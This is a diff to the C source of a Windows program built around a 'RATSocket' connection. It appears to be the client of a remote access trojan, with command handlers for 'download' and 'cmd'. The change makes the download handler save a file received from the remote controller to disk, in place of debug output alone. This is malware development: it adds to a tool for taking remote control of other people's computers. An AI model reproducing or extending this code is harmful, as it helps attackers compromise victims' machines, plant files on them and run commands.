@@ -118,24 +118,7 @@ WinMain(HINSTANCE hInstance,
 		HINSTANCE hPrevInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
-{
-	// HANDLE fileHandle = CreateFileA("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	// if ( fileHandle == INVALID_HANDLE_VALUE )
-	// {
-	// 	OutputDebugStringA("Error");
-	// }
-
-	// char* toWriteBuffer = "This is a test.";
-	// DWORD bytesWritten;
-	// WriteFile(fileHandle, toWriteBuffer, 15, &bytesWritten, 0);
-
-	// char buffer[256];
-	// sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
-	// OutputDebugStringA(buffer);
-	
-	// CloseHandle(fileHandle);
-	// return 0;
-	
+{	
 	srand( (unsigned)time( NULL ) );
 	
 	RATSocket ratSocket = {};
@@ -305,6 +288,7 @@ WinMain(HINSTANCE hInstance,
 		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
 		{
 			char* totalReceivedData = NULL;
+			int totalBytesRead = 0;
 			
 			char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
 			if ( f_recv(ratSocket.socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
@@ -313,7 +297,6 @@ WinMain(HINSTANCE hInstance,
 
 				totalReceivedData = (char*)calloc(fileSize + 1, sizeof(char));
 				
-				int totalBytesRead = 0;
 				for (;;)
 				{
 					char writeBuffer[SOCKET_BUFFER_SIZE] = {};
@@ -346,6 +329,23 @@ WinMain(HINSTANCE hInstance,
 			}
 
 			OutputDebugStringA(totalReceivedData);
+
+			HANDLE fileHandle = CreateFileA("test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if ( fileHandle == INVALID_HANDLE_VALUE )
+			{
+				OutputDebugStringA("Error");
+			}
+
+			char* toWriteBuffer = "This is a test.";
+			DWORD bytesWritten;
+			WriteFile(fileHandle, totalReceivedData, totalBytesRead, &bytesWritten, 0);
+
+			char buffer[256];
+			sprintf_s(buffer, "Bytes written: %ld\n", bytesWritten);
+			OutputDebugStringA(buffer);
+	
+			CloseHandle(fileHandle);
+			
 			free(totalReceivedData);
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
